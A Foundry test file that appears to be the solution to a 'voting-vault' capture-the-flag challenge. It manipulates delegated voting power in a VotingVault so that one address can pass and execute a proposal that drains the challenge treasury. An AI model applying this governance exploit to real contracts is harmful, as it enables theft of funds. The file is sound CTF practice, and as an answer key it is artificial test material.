// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Setup as Challenge} from "../../src/voting-vault/Setup.sol";
import {GREY} from "../../src/voting-vault/lib/GREY.sol";
import {VotingVault} from "../../src/voting-vault/VotingVault.sol";
import {Treasury} from "../../src/voting-vault/Treasury.sol";

contract SolutionTest is Test {
    Challenge internal challenge;

    GREY public grey;
    VotingVault public vault;
    Treasury public treasury;

    function setUp() public {
        challenge = new Challenge();
        grey = challenge.grey();
        vault = challenge.vault();
        treasury = challenge.treasury();
    }

    function testExploit() public {
        uint256 pk0 = block.timestamp;
        address player = vm.addr(pk0);

        uint256 pk1 = block.timestamp + block.number;
        address hacker = vm.addr(pk1);

        challenge.claim();

        grey.approve(address(vault), type(uint256).max);
        uint256 amount = grey.balanceOf(address(this));

        vault.lock(amount / 3);
        vault.delegate(player);

        vault.lock(amount / 2);
        vault.delegate(hacker);

        vault.lock(amount / 6);
        vault.delegate(player);

        uint256 x = vault.votingPower(player, block.number);
        uint256 y = vault.votingPower(hacker, block.number);
        uint256 z = vault.votingPower(address(this), block.number);

        console2.log("player voting power: ", x);
        console2.log("hacker voting power: ", y);
        console2.log("contract voting power: ", z);

        uint256 id = treasury.propose(address(grey), grey.balanceOf(address(treasury)), address(hacker));

        uint256 blockNumber = block.number;
        vm.roll(blockNumber + 1);

        vm.startPrank(hacker);
        treasury.vote(id);
        treasury.execute(id);
        assertTrue(challenge.isSolved());
        vm.stopPrank();
    }
}
